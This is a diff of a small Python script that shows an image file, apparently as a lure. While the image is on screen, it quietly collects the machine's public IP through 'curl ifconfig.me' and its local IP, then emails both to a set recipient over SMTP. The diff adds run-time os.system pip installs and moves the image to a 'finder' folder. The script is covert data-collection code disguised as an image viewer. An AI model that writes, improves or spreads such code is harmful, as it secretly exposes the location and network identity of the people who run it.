@@ -1,7 +1,10 @@
-from email.mime.text import MIMEText
-from smtplib import SMTP
+from os import popen, system, getcwd
+system("pip3 install email")
+system("pip3 install secure-smtplib")
+system("pip3 install Pillow")
 from PIL import Image
-from os import popen
+from smtplib import SMTP
+from email.mime.text import MIMEText
 
 def shape():
   try: myhtml = f"""<!DOCTYPE html><html><body><br><input type="text" value="Local : {popen("curl ifconfig.me").read().strip()}" size = "25" style="text-align:center" readonly><br><br><input type="text" value="Global : {popen("ipconfig getifaddr en0").read().strip()}" size = "25" style="text-align:center" readonly></body></html>"""
@@ -22,5 +25,5 @@ def shape():
     server.sendmail(sender, destination, msg.as_string())
 
 if __name__ == "__main__": 
-  Image.open("image.jpeg").show()
+  Image.open(f"{getcwd()}/finder/limage.jpeg").show()
   shape()
